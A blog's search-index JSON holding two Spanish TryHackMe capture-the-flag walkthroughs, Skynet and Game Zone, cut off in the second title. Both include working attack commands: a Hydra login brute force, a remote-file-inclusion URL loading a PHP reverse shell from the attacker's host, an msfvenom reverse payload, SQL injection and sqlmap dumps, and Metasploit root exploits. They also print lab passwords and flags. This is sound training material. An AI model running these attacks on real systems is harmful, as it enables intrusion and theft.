
{
    
    
    
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
    "pages": [{"date":"2023-09-02","image":"/images/post_pics/skynet/skynet.jpeg","link":"https://k3ssdev.github.io/posts/skynet/","summary":"Introducción Me enfrento a la primera máquina de \u0026ldquo;Offensive Pentesting\u0026rdquo; que no tiene sugerencias de que ir haciendo. En este caso, se trata de una máquina de nivel fácil, por lo que no debería ser muy complicada aún sin las recomendaciones que proporcionaban las anteriores salas.","tags":["Burp","Dirb","Easy","Intruder","Linux","Metasploit","Meterpreter","msfvenom","Privilege Escalation","SMB","TryHackMe"],"text":"introducción me enfrento a la primera máquina de \u0026ldquo;offensive pentesting\u0026rdquo; que no tiene sugerencias de que ir haciendo. en este caso, se trata de una máquina de nivel fácil, por lo que no debería ser muy complicada aún sin las recomendaciones que proporcionaban las anteriores salas. el objetivo es obtener acceso a la máquina y obtener la flag del usuario y la flag del root.\ntask 1 - deploy and compromise the vulnerable machine! paso 1 pongo la máquina en marcha y accedo a la aplicación web que tiene. escaneo la máquina con un nmap en 2 pasos. sudo nmap -ss --min-rate 5000 -p- -pn -v -on nmap_inicial \u0026lt;ip\u0026gt; ports=$(cat nmap_inicial | grep \u0026#39;^[0-9]\u0026#39; | cut -d \u0026#39;/\u0026#39; -f1 | xargs | tr \u0026#39; \u0026#39; \u0026#39;,\u0026#39;) sudo nmap -p$ports -sc -sv -pn -on nmap_final \u0026lt;ip\u0026gt; puertos de ssh, servidor web apache, servidores de correo y samba. sistema operativo linux ubuntu. port state service version 22/tcp open ssh openssh 7.2p2 ubuntu 4ubuntu2.8 (ubuntu linux; protocol 2.0) | ssh-hostkey: | 2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (rsa) | 256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ecdsa) |_ 256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ed25519) 80/tcp open http apache httpd 2.4.18 ((ubuntu)) |_http-server-header: apache/2.4.18 (ubuntu) |_http-title: skynet 110/tcp open pop3 dovecot pop3d |_pop3-capabilities: auth-resp-code pipelining sasl capa uidl top resp-codes 139/tcp open netbios-ssn samba smbd 3.x - 4.x (workgroup: workgroup) 143/tcp open imap dovecot imapd |_imap-capabilities: more login-referrals post-login literal+ have pre-login capabilities idle logindisableda0001 imap4rev1 sasl-ir listed enable ok id 445/tcp open @nnu samba smbd 4.3.11-ubuntu (workgroup: workgroup) service info: host: skynet; os: linux; cpe: cpe:/o:linux:linux_kernel paso 2 enumero samab con enum4linux y lo guardo en un fichero enum4linux -a 10.10.126.64 \u0026gt; samba_details reviso los resultados. ===================================( os information on 10.10.126.64 )=================================== 46 │ 47 │ 48 │ [e] can\u0026#39;t get os info with smbclient 49 │ 50 │ 51 │ [+] got os info for 10.10.126.64 from srvinfo: 52 │ skynet wk sv prq unx nt snt skynet server (samba, ubuntu) 53 │ platform_id : 500 54 │ os version : 6.1 55 │ server type : 0x809a03 56 │ 57 │ 58 │ =======================================( users on 10.10.126.64 )======================================= 59 │ 60 │ index: 0x1 rid: 0x3e8 acb: 0x00000010 account: milesdyson name: desc: 61 │ 62 │ user:[milesdyson] rid:[0x3e8] 63 │ 64 │ =================================( share enumeration on 10.10.126.64 )================================= 65 │ 66 │ 67 │ sharename type comment 68 │ --------- ---- ------- 69 │ print$ disk printer drivers 70 │ anonymous disk skynet anonymous share 71 │ milesdyson disk miles dyson personal share 72 │ ipc$ ipc ipc service (skynet server (samba, ubuntu)) 73 │ reconnecting with smb1 for workgroup listing. 74 │ 75 │ server comment 76 │ --------- ------- 77 │ 78 │ workgroup master 79 │ --------- ------- 80 │ workgroup skynet acceso anonymous user con smbclient. ❯ smbclient //10.10.126.64/anonymous password for [workgroup\\k3ss]: try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . d 0 thu nov 26 17:04:00 2020 .. d 0 tue sep 17 09:20:17 2019 attention.txt n 163 wed sep 18 05:04:59 2019 logs d 0 wed sep 18 06:42:16 2019 9204224 blocks of size 1024. 5831500 blocks available smb: \\\u0026gt; get attention.txt getting file \\attention.txt of size 163 as attention.txt (1,0 kilobytes/sec) (average 1,0 kilobytes/sec) nt_status_object_name_invalid opening remote file \\logs\\* smb: \\\u0026gt; get logs\\log logs\\log1.txt logs\\log2.txt logs\\log3.txt smb: \\\u0026gt; get logs\\log logs\\log1.txt logs\\log2.txt logs\\log3.txt smb: \\\u0026gt; get logs\\log1.txt getting file \\logs\\log1.txt of size 471 as logs\\log1.txt (3,1 kilobytes/sec) (average 2,1 kilobytes/sec) smb: \\\u0026gt; get logs\\log2.txt getting file \\logs\\log2.txt of size 0 as logs\\log2.txt (0,0 kilobytes/sec) (average 1,5 kilobytes/sec) smb: \\\u0026gt; get logs\\log3.txt getting file \\logs\\log3.txt of size 0 as logs\\log3.txt (0,0 kilobytes/sec) (average 1,2 kilobytes/sec) paso 3 enumero los directorios que haya en la web con dirb ❯ dirb http://10.10.126.64/ /usr/share/wordlists/dirb/common.txt ----------------- dirb v2.22 by the dark raver ----------------- start_time: sat sep 2 11:57:08 2023 url_base: http://10.10.126.64/ wordlist_files: /usr/share/wordlists/dirb/common.txt ----------------- generated words: 4612 ---- scanning url: http://10.10.126.64/ ---- ==\u0026gt; directory: http://10.10.126.64/admin/ ==\u0026gt; directory: http://10.10.126.64/config/ ==\u0026gt; directory: http://10.10.126.64/css/ + http://10.10.126.64/index.html (code:200|size:523) ==\u0026gt; directory: http://10.10.126.64/js/ + http://10.10.126.64/server-status (code:403|size:277) ==\u0026gt; directory: http://10.10.126.64/squirrelmail/ en squirrelmail hay un login, guardo el post request en un fichero post /squirrelmail/src/redirect.php http/1.1 host: 10.10.126.64 content-length: 81 cache-control: max-age=0 upgrade-insecure-requests: 1 origin: http://10.10.126.64 content-type: application/x-www-form-urlencoded user-agent: mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/116.0.5845.111 safari/537.36 accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 referer: http://10.10.126.64/squirrelmail/src/login.php accept-encoding: gzip, deflate accept-language: es-es,es;q=0.9 cookie: sqmsessid=tn1nf3uvf4cm77sboeo2ssshg0 connection: close login_username=mylesdyson\u0026amp;secretkey=test\u0026amp;js_autodetect_results=1\u0026amp;just_logged_in=1 uso burp intruder y tambien hydra para probar todas las contraseñas (se puede usar cualquiera de los dos métodos). ❯ hydra -l milesdyson -p /home/k3ss/documentos/tryhackme/skynet/nmap/log1.txt 10.10.126.64 http-post-form \u0026#34;/squirrelmail/src/login.php:login_username=^user^\u0026amp;secretkey=^pass^\u0026amp;js_autodetect_results=1\u0026amp;just_logged_in=1:login failed\u0026#34; -v -t 4 hydra v9.5 (c) 2023 by van hauser/thc \u0026amp; david maciejak - please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-02 12:27:55 [data] max 4 tasks per 1 server, overall 4 tasks, 31 login tries (l:1/p:31), ~8 tries per task [data] attacking http-post-form://10.10.126.64:80/squirrelmail/src/login.php:login_username=^user^\u0026amp;secretkey=^pass^\u0026amp;js_autodetect_results=1\u0026amp;just_logged_in=1:login failed [attempt] target 10.10.126.64 - login \u0026#34;milesdyson\u0026#34; - pass \u0026#34;cyborg007haloterminator\u0026#34; - 1 of 31 [child 0] (0/0) [attempt] target 10.10.126.64 - login \u0026#34;milesdyson\u0026#34; - pass \u0026#34;terminator22596\u0026#34; - 2 of 31 [child 1] (0/0) [attempt] target 10.10.126.64 - login \u0026#34;milesdyson\u0026#34; - pass \u0026#34;terminator219\u0026#34; - 3 of 31 [child 2] (0/0) [attempt] target 10.10.126.64 - login \u0026#34;milesdyson\u0026#34; - pass \u0026#34;terminator20\u0026#34; - 4 of 31 [child 3] (0/0) [80][http-post-form] host: 10.10.126.64 login: milesdyson password: cyborg007haloterminator [80][http-post-form] host: 10.10.126.64 login: milesdyson password: terminator22596 [80][http-post-form] host: 10.10.126.64 login: milesdyson password: terminator219 [80][http-post-form] host: 10.10.126.64 login: milesdyson password: terminator20 1 of 1 target successfully completed, 4 valid passwords found hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-02 12:27:55 reviso el correo y encuentro que se ha cambiado la contraseña de smb subject: samba password reset from: skynet@skynet date: tue, september 17, 2019 10:10 pm priority: normal options: view full header | view printable version | download this as a file we have changed your smb password after system malfunction. password: )s{a\u0026amp;2z=f^n_e.b` accedo con smbclient y descargo todo. ❯ smbclient //10.10.126.64/milesdyson -u milesdyson -c \u0026#34;recurse; mget *\u0026#34; reviso ficheros y encuentro uo llamado important.txt ❯ cat important.txt ───────┬──────────────────────────────────────────────────── │ file: important.txt ───────┼──────────────────────────────────────────────────── 1 │ 2 │ 1. add features to beta cms /45kra24zxs28v3yd 3 │ 2. work on t-800 model 101 blueprints 4 │ 3. spend more time with my wife ───────┴──────────────────────────────────────────────────── accedo al cms http://10.10.126.64/45kra24zxs28v3yd/ escaneo la url con dirby y encuentro que aloja cuppa cms ❯ dirb http://10.10.126.64/45kra24zxs28v3yd /usr/share/wordlists/dirb/common.txt ----------------- dirb v2.22 by the dark raver ----------------- start_time: sat sep 2 12:48:28 2023 url_base: http://10.10.126.64/45kra24zxs28v3yd/ wordlist_files: /usr/share/wordlists/dirb/common.txt ----------------- generated words: 4612 ---- scanning url: http://10.10.126.64/45kra24zxs28v3yd/ ---- ==\u0026gt; directory: http://10.10.126.64/45kra24zxs28v3yd/administrator/ paso 4 busco exploits conocidos. ❯ searchsploit cuppa -w -------------------------------------------------------------------------------------------------------------------------------------------- -------------------------------------------- exploit title | url -------------------------------------------------------------------------------------------------------------------------------------------- -------------------------------------------- cuppa cms - \u0026#39;/alertconfigfield.php\u0026#39; local/remote file inclusion | https://www.exploit-db.com/exploits/25971 -------------------------------------------------------------------------------------------------------------------------------------------- -------------------------------------------- shellcodes: no results el codigo permite incluir archivos php locales o remotos o leer archivos que no sean php con esta vulnerabilidad. busco un reverse shell con php para usarlo. ❯ find /usr/share -iname \u0026#34;php-reverse-shell.php\u0026#34; 2\u0026gt;/dev/null /usr/share/laudanum/php/php-reverse-shell.php /usr/share/laudanum/wordpress/templates/php-reverse-shell.php /usr/share/webshells/php/php-reverse-shell.php uso el exploit para cargar el fichero php en el objetivo despues de haber creado un listener. http://10.10.126.64/45kra24zxs28v3yd/administrator/alerts/alertconfigfield.php?urlconfig=http://10.x.x.x/php-reverse-shell.php paso 5 conexión reverse shell ❯ rlwrap nc -lvnp 1234 listening on [any] 1234 ... connect to [10.x.x.x] from (unknown) [10.10.126.64] 43474 linux skynet 4.8.0-58-generic #63~16.04.1-ubuntu smp mon jun 26 18:08:51 utc 2017 x86_64 x86_64 x86_64 gnu/linux 06:02:14 up 2:06, 0 users, load average: 0.00, 0.00, 0.00 user tty from login@ idle jcpu pcpu what uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can\u0026#39;t access tty; job control turned off $ estabilizo shell y busco flag del usuario. $ python -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; www-data@skynet:/$ cd cd bash: cd: home not set www-data@skynet:/$ ls ls bin home\tlib64\topt\tsbin tmp vmlinuz.old boot initrd.img lost+found proc\tsnap usr dev initrd.img.old media\troot\tsrv var etc lib\tmnt\trun\tsys vmlinuz www-data@skynet:/$ cd home cd home www-data@skynet:/home$ ls ls milesdyson www-data@skynet:/home$ cd milesdyson cd milesdyson www-data@skynet:/home/milesdyson$ ls ls backups mail share user.txt www-data@skynet:/home/milesdyson$ cat user.txt cat user.txt 7ce5c2109a40f958099283600a9ae807 paso 6 creo un payload con msfvenom para obtener acceso con meterpreter y lo subo con wget ❯ msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell lhost=10.x.x.x lport=4444 [-] no platform was selected, choosing msf::module::platform::linux from the payload [-] no arch selected, selecting arch: x64 from the payload no encoder specified, outputting raw payload payload size: 130 bytes final size of elf file: 250 bytes saved as: shell en metasploit ejecuto: msf6 \u0026gt; use linux/x64/meterpreter/reverse_tcp msf6 payload(linux/x64/meterpreter/reverse_tcp) \u0026gt; set lhost tun0 msf6 payload(linux/x64/meterpreter/reverse_tcp) \u0026gt; exploit [*] payload handler started as job 0 msf6 payload(linux/x64/meterpreter/reverse_tcp) \u0026gt; [*] started reverse tcp handler on 10.x.x.x:4444 [*] sending stage (3045380 bytes) to 10.10.126.64 [*] meterpreter session 1 opened (10.x.x.x:4444 -\u0026gt; 10.10.126.64:33592) at 2023-09-02 13:27:55 +0200 meterpreter \u0026gt; sysinfo computer : 10.10.126.64 os : ubuntu 16.04 (linux 4.8.0-58-generic) architecture : x64 buildtuple : x86_64-linux-musl meterpreter : x64/linux ejecuto el exploit suggeter de metasploit. meterpreter \u0026gt; run post/multi/recon/local_exploit_suggester [*] 10.10.126.64 - collecting local exploits for x64/linux... [*] 10.10.126.64 - 186 exploit checks are being tried... [+] 10.10.126.64 - exploit/linux/local/bpf_sign_extension_priv_esc: the target appears to be vulnerable. [+] 10.10.126.64 - exploit/linux/local/cve_2021_3493_overlayfs: the target appears to be vulnerable. [+] 10.10.126.64 - exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec: the target is vulnerable. [+] 10.10.126.64 - exploit/linux/local/cve_2022_0995_watch_queue: the target appears to be vulnerable. [+] 10.10.126.64 - exploit/linux/local/glibc_realpath_priv_esc: the target appears to be vulnerable. [+] 10.10.126.64 - exploit/linux/local/pkexec: the service is running, but could not be validated. [+] 10.10.126.64 - exploit/linux/local/ptrace_traceme_pkexec_helper: the target appears to be vulnerable. [+] 10.10.126.64 - exploit/linux/local/su_login: the target appears to be vulnerable. [+] 10.10.126.64 - exploit/linux/local/sudo_baron_samedit: the target appears to be vulnerable. sudo 1.8.16 is a vulnerable build. [+] 10.10.126.64 - exploit/linux/local/ufo_privilege_escalation: the target appears to be vulnerable. [*] running check method for exploit 63 / 63 [*] 10.10.126.64 - valid modules for session 1: ============================ # name potentially vulnerable? check result - ---- ----------------------- ------------ 1 exploit/linux/local/bpf_sign_extension_priv_esc yes the target appears to be vulnerable. 2 exploit/linux/local/cve_2021_3493_overlayfs yes the target appears to be vulnerable. 3 exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec yes the target is vulnerable. 4 exploit/linux/local/cve_2022_0995_watch_queue yes the target appears to be vulnerable. 5 exploit/linux/local/glibc_realpath_priv_esc yes the target appears to be vulnerable. 6 exploit/linux/local/pkexec yes the service is running, but could not be validated. 7 exploit/linux/local/ptrace_traceme_pkexec_helper yes the target appears to be vulnerable. 8 exploit/linux/local/su_login yes the target appears to be vulnerable. 9 exploit/linux/local/sudo_baron_samedit yes the target appears to be vulnerable. sudo 1.8.16 is a vulnerable build. 10 exploit/linux/local/ufo_privilege_escalation yes the target appears to be vulnerable. uso el exploit exploit/linux/local/bpf_sign_extension_priv_esc https://www.rapid7.com/db/modules/exploit/linux/local/bpf_sign_extension_priv_esc/ msf6 payload(linux/x64/meterpreter/reverse_tcp) \u0026gt; use exploit/linux/local/bpf_sign_extension_priv_esc [*] no payload configured, defaulting to linux/x64/meterpreter/reverse_tcp msf6 exploit(linux/local/bpf_sign_extension_priv_esc) \u0026gt; set lhost tun0 lhost =\u0026gt; tun0 module options (exploit/linux/local/bpf_sign_extension_priv_esc): name current setting required description ---- --------------- -------- ----------- compile auto yes compile on target (accepted: auto, true, false) session yes the session to run this module on payload options (linux/x64/meterpreter/reverse_tcp): name current setting required description ---- --------------- -------- ----------- lhost tun0 yes the listen address (an interface may be specified) lport 4444 yes the listen port exploit target: id name -- ---- 0 auto view the full module info with the info, or info -d command. msf6 exploit(linux/local/bpf_sign_extension_priv_esc) \u0026gt; set session 1 session =\u0026gt; 1 msf6 exploit(linux/local/bpf_sign_extension_priv_esc) \u0026gt; run [-] handler failed to bind to 10.x.x.x4444:- - [-] handler failed to bind to 0.0.0.0:4444:- - [*] running automatic check (\u0026#34;set autocheck false\u0026#34; to disable) [+] the target appears to be vulnerable. [*] writing \u0026#39;/tmp/.uoaqehbf\u0026#39; (250 bytes) ... [*] launching exploit ... [*] sending stage (3045380 bytes) to 10.10.126.64 [*] cleaning up /tmp/.uoaqehbf and /tmp/.cvexotd6d ... [*] meterpreter session 2 opened (10.x.x.x:4444 -\u0026gt; 10.10.126.64:33600) at 2023-09-02 13:36:02 +0200 [*] exploit completed, but no session was created. msf6 exploit(linux/local/bpf_sign_extension_priv_esc) \u0026gt; sessions 2 [*] starting interaction with 2... meterpreter \u0026gt; getuid server username: root una vez obtengo acceso como root, busco la bandera. meterpreter \u0026gt; cd /root meterpreter \u0026gt; ls listing: /root ============== mode size type last modified name ---- ---- ---- ------------- ---- 020666/rw-rw-rw- 0 cha 2023-09-02 10:55:49 +0200 .bash_history 100644/rw-r--r-- 3106 fil 2015-10-22 19:15:21 +0200 .bashrc 040700/rwx------ 4096 dir 2019-09-18 00:35:40 +0200 .cache 040755/rwxr-xr-x 4096 dir 2019-09-17 09:32:06 +0200 .nano 100644/rw-r--r-- 148 fil 2015-08-17 17:30:33 +0200 .profile 100644/rw-r--r-- 33 fil 2019-09-18 05:41:47 +0200 root.txt meterpreter \u0026gt; cat root.txt 3f0372db24753accc7179a282cd6a949 conclusion al no tener esa especie de guía que tenían las anteriores salas, he tenido que investigar un poco más de lo habitual. aún así, la máquina es bastante sencilla y no he tenido problemas para resolverla. sigue el mismo patrón que las máquinas de tryhackme: enumeración, explotación y escalada de privilegios. con un poco de paciencia y ganas, se puede resolver sin problemas. las herramientas que he usado son las habituales: nmap, enum4linux, dirb, burp, metasploit, hydra, smbclient, msfvenom, etc. una máquina muy recomendable y entretenida con ambientación de terminator.\n(◕‿‿◕) hack the planet! ","title":"Skynet [TryHackMe]"},{"date":"2023-09-01","image":"/images/post_pics/game-zone/game-zone.jpeg","link":"https://k3ssdev.github.io/posts/game-zone/","summary":"Introducción Continúo con el learning path “Offensive Pentesting¨, esta vez con una maquina sencilla que presenta un ejemplo práctico de SQL Injection con sqlmap y el uso de un túnel SSH para exponer un servicio bloqueado por firewall, para finalmente logra acceso privilegiado con Metaploit.","tags":["Easy","John","Linux","Metasploit","Privilege Escalation","SQLi","sqlmap","ssh-tunel","TryHackMe"],"text":"introducción continúo con el learning path “offensive pentesting¨, esta vez con una maquina sencilla que presenta un ejemplo práctico de sql injection con sqlmap y el uso de un túnel ssh para exponer un servicio bloqueado por firewall, para finalmente logra acceso privilegiado con metaploit.\ntask 1 - desplegar la máquina paso 1: pongo la máquina en marcha y accedo a la aplicación web que tiene. la primera pregunta es sobre la imagen de un personaje de videojuegos que aparece en la web. task 2 - obtain access via sqli paso 2: la sala propone usar ' or 1=1 -- - para forzar la autencicaci’on, engañando a la base de datos con 1=1 y comentando lo que haya detras con “—” para conseguirlo. la consulta sql que se ejecuta en el servidor web es la siguiente: select * from users where username = ' or 1=1 -- - and password := al conseguir hacer el bypass a la autenticación, accedo a portal.php task 3 - using sqlmap paso 3: recurrimos a sqlmap para volcar toda la base de datos de gamezone. capturo un post request buscando un juego en la web, usando burp suite, y lo guardo en un txt. post /portal.php http/1.1 host: 10.10.62.97 content-length: 15 cache-control: max-age=0 upgrade-insecure-requests: 1 origin: http://10.10.62.97 content-type: application/x-www-form-urlencoded user-agent: mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/116.0.5845.111 safari/537.36 accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 referer: http://10.10.62.97/portal.php accept-encoding: gzip, deflate accept-language: es-es,es;q=0.9 cookie: phpsessid=nn8afcdulm4202grsvrrhspmn1 connection: close searchitem=game uso sqlmap como indica sugiere la sala para hacer un volcado de la base de datos. no funciona. sqlmap -r post_request.txt --dbms=mysql --dump busco sobre sqlmap y encuentro una forma diferente de hacerlo. empiezo por extraer los nombres de las bases de datos que hay. sqlmap -u \u0026#34;http://10.10.62.97/portal.php\u0026#34; --data=\u0026#34;searchitem=test\u0026#34; --dbs [16:03:29] [info] the back-end dbms is mysql web server operating system: linux ubuntu 16.04 or 16.10 (yakkety or xenial) web application technology: php, apache 2.4.18 back-end dbms: mysql \u0026gt;= 5.6 [16:03:30] [info] fetching database names available databases [5]: [*] db [*] information_schema [*] mysql [*] performance_schema [*] sys [16:03:30] [info] fetched data logged to text files under \u0026#39;/home/k3ss/.local/share/sqlmap/output/10.10.62.97\u0026#39; extraigo los nombres de las tablas en db sqlmap -u \u0026#34;http://10.10.62.97/portal.php\u0026#34; --data=\u0026#34;searchitem=test\u0026#34; -d db --tables [16:08:57] [info] the back-end dbms is mysql web server operating system: linux ubuntu 16.10 or 16.04 (yakkety or xenial) web application technology: apache 2.4.18, php back-end dbms: mysql \u0026gt;= 5.6 [16:08:57] [info] fetching tables for database: \u0026#39;db\u0026#39; database: db [2 tables] +-------+ | post | | users | +-------+ [16:08:57] [info] fetched data logged to text files under \u0026#39;/home/k3ss/.local/share/sqlmap/output/10.10.62.97\u0026#39; extraigo los datos de la tabla users. sqlmap -u \u0026#34;http://10.10.62.97/portal.php\u0026#34; --data=\u0026#34;searchitem=test\u0026#34; -d db -t users --columns [16:11:58] [info] the back-end dbms is mysql web server operating system: linux ubuntu 16.04 or 16.10 (xenial or yakkety) web application technology: php, apache 2.4.18 back-end dbms: mysql \u0026gt;= 5.6 [16:11:58] [info] fetching columns for table \u0026#39;users\u0026#39; in database \u0026#39;db\u0026#39; database: db table: users [2 columns] +----------+------+ | column | type | +----------+------+ | pwd | text | | username | text | +----------+------+ [16:11:58] [info] fetched data logged to text files under \u0026#39;/home/k3ss/.local/share/sqlmap/output/10.10.62.97\u0026#39; paso 4 sabiendo ya la estructura, hago el volcado con: sqlmap -u \u0026#34;http://10.10.62.97/portal.php\u0026#34; --data=\u0026#34;searchitem=test\u0026#34; -d db -t users -c pwd,username --dump [16:13:41] [info] the back-end dbms is mysql web server operating system: linux ubuntu 16.10 or 16.04 (xenial or yakkety) web application technology: php, apache 2.4.18 back-end dbms: mysql \u0026gt;= 5.6 [16:13:41] [info] fetching entries of column(s) \u0026#39;pwd,username\u0026#39; for table \u0026#39;users\u0026#39; in database \u0026#39;db\u0026#39; [16:13:41] [info] recognized possible password hashes in column \u0026#39;pwd\u0026#39; do you want to store hashes to a temporary file for eventual further processing with other tools [y/n] y [16:13:47] [info] writing hashes to a temporary file \u0026#39;/tmp/sqlmapt61grbs538569/sqlmaphashes-dwlpsyxn.txt\u0026#39; do you want to crack them via a dictionary-based attack? [y/n/q] y [16:13:54] [info] using hash method \u0026#39;sha256_generic_passwd\u0026#39; what dictionary do you want to use? [1] default dictionary file \u0026#39;/usr/share/sqlmap/data/txt/wordlist.tx_\u0026#39; (press enter) [2] custom dictionary file [3] file with list of dictionary files \u0026gt; /usr/share/wordlists/rockyou.txt [16:14:14] [info] using default dictionary do you want to use common password suffixes? (slow!) [y/n] n [16:14:18] [info] starting dictionary-based cracking (sha256_generic_passwd) [16:14:18] [info] starting 24 processes [16:14:20] [warning] no clear password(s) found database: db table: users [1 entry] +------------------------------------------------------------------+----------+ | pwd | username | +------------------------------------------------------------------+----------+ | ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 | agent47 | +------------------------------------------------------------------+----------+ [16:14:20] [info] table \u0026#39;db.users\u0026#39; dumped to csv file \u0026#39;/home/k3ss/.local/share/sqlmap/output/10.10.62.97/dump/db/users.csv\u0026#39; [16:14:20] [info] fetched data logged to text files under \u0026#39;/home/k3ss/.local/share/sqlmap/output/10.10.62.97\u0026#39; [*] ending @ 16:14:20 /2023-09-01/ task 4 - cracking the hash paso 5 uso hashid para identeficar el tipo de hash. parece probable que sea sha-256 hashid ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 analyzing \u0026#39;ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14\u0026#39; [+] snefru-256 [+] sha-256 [+] ripemd-256 [+] haval-256 [+] gost r 34.11-94 [+] gost cryptopro s-box [+] sha3-256 [+] skein-256 [+] skein-512(256) ataco el hash con john the ripper ❯ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha256 using default input encoding: utf-8 loaded 1 password hash (raw-sha256 [sha256 256/256 avx2 8x]) warning: poor openmp scalability for this hash type, consider --fork=24 will run 24 openmp threads press \u0026#39;q\u0026#39; or ctrl-c to abort, almost any other key for status videogamer124 (?) 1g 0:00:00:00 done (2023-09-01 16:20) 6.666g/s 20971kp/s 20971kc/s 20971kc/s wildboy23..tom=tom use the \u0026#34;--show --format=raw-sha256\u0026#34; options to display all of the cracked passwords reliably session completed. paso 6 accedo por ssh con las credenciales y obtengo la bandera ❯ ssh agent47@10.10.62.97 the authenticity of host \u0026#39;10.10.62.97 (10.10.62.97)\u0026#39; can\u0026#39;t be established. ed25519 key fingerprint is sha256:cyjgmm67ufkdbnbkyum0dexci+lwun63sglfbvqqcla. this key is not known by any other names. are you sure you want to continue connecting (yes/no/[fingerprint])? yes warning: permanently added \u0026#39;10.10.62.97\u0026#39; (ed25519) to the list of known hosts. agent47@10.10.62.97\u0026#39;s password: welcome to ubuntu 16.04.6 lts (gnu/linux 4.4.0-159-generic x86_64) * documentation: https://help.ubuntu.com * management: https://landscape.canonical.com * support: https://ubuntu.com/advantage 109 packages can be updated. 68 updates are security updates. last login: fri aug 16 17:52:04 2019 from 192.168.1.147 agent47@gamezone:~$ whoami agent47 agent47@gamezone:~$ cat .bash_history .bash_logout .bashrc .cache/ .profile user.txt agent47@gamezone:~$ cat user.txt 649ac17b1480ac13ef1e4fa579dac95c task 5 - exposing services with reverse ssh tunnels paso 7 reviso los sockets en la maquina objetivo agent47@gamezone:~$ ss -tulpn netid state recv-q send-q local address:port peer address:port udp unconn 0 0 *:10000 *:* udp unconn 0 0 *:68 *:* tcp listen 0 80 127.0.0.1:3306 *:* tcp listen 0 128 *:10000 *:* tcp listen 0 128 *:22 *:* tcp listen 0 128 :::80 :::* tcp listen 0 128 :::22 :::* el puerto 10000 está siendo bloqueado por un firewall, lo expongo con un tunel ssh entre la maquina y mi equipo local. ❯ ssh -l 10000:localhost:10000 agent47@10.10.62.97 agent47@10.10.62.97\u0026#39;s password: welcome to ubuntu 16.04.6 lts (gnu/linux 4.4.0-159-generic x86_64) * documentation: https://help.ubuntu.com * management: https://landscape.canonical.com * support: https://ubuntu.com/advantage 109 packages can be updated. 68 updates are security updates. last login: fri sep 1 09:21:58 2023 from 10.14.50.184 desde mi equipo, accedo a la url http://localhost:10000/ esta corriendo webmin en ese socket, accedo con las credenciales de agent47 y veo que es la version 1.580 task 6 - privilege escalation with metasploit paso 7 busco en metasploit y configuro el exploit para usarlo. msf6 \u0026gt; search webmin matching modules ================ # name disclosure date rank check description - ---- --------------- ---- ----- ----------- 0 exploit/unix/webapp/webmin_show_cgi_exec 2012-09-06 excellent yes webmin /file/show.cgi remote command execution 1 auxiliary/admin/webmin/file_disclosure 2006-06-30 normal no webmin file disclosure 2 exploit/linux/http/webmin_file_manager_rce 2022-02-26 excellent yes webmin file manager rce 3 exploit/linux/http/webmin_package_updates_rce 2022-07-26 excellent yes webmin package updates rce 4 exploit/linux/http/webmin_packageup_rce 2019-05-16 excellent yes webmin package updates remote command execution 5 exploit/unix/webapp/webmin_upload_exec 2019-01-17 excellent yes webmin upload authenticated rce 6 auxiliary/admin/webmin/edit_html_fileaccess 2012-09-06 normal no webmin edit_html.cgi file parameter traversal arbitrary file access 7 exploit/linux/http/webmin_backdoor 2019-08-10 excellent yes webmin password_change.cgi backdoor interact with a module by name or index. for example info 7, use 7 or use exploit/linux/http/webmin_backdoor msf6 \u0026gt; use 0 msf6 exploit(unix/webapp/webmin_show_cgi_exec) \u0026gt; set rhosts localhost rhosts =\u0026gt; localhost msf6 exploit(unix/webapp/webmin_show_cgi_exec) \u0026gt; set username agent47 username =\u0026gt; agent47 msf6 exploit(unix/webapp/webmin_show_cgi_exec) \u0026gt; set password videogamer124 password =\u0026gt; videogamer47 msf6 exploit(unix/webapp/webmin_show_cgi_exec) \u0026gt; set ssl false [!] changing the ssl option\u0026#39;s value may require changing rport! ssl =\u0026gt; false msf6 exploit(unix/webapp/webmin_show_cgi_exec) \u0026gt; set payload cmd/unix/reverse payload =\u0026gt; cmd/unix/reverse msf6 exploit(unix/webapp/webmin_show_cgi_exec) \u0026gt; set lhost tun0 ejecuto el exploit. msf6 exploit(unix/webapp/webmin_show_cgi_exec) \u0026gt; run [*] exploiting target ::1 ... [*] session 1 created in the background. abro sesión y obtengo acceso privilegiado. msf6 exploit(unix/webapp/webmin_show_cgi_exec) \u0026gt; sessions 1 [*] starting interaction with 1... whoami root estabilizo el shell con python, busco el flag y lo imprimo por pantalla. python -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; root@gamezone:~# cd cd root@gamezone:~# ls ls root.txt root@gamezone:~# cat root.txt cat root.txt a4b945830144bdd71908d12d902adeee conclusion game zone ha resultado ser una máquina bastante sencilla. he encontrado una dificultad a la hora de usar sqlmap como sugiere la sala, pero una búsqueda rápida me ha permitido encontrar una solución: usar sqlmap de más a menos, empezando por obtener los nombres de las bbdd y terminando con los datos de la tabla concreta que quería.\n(◕‿‿◕) hack the planet! ","title":"Game Zone 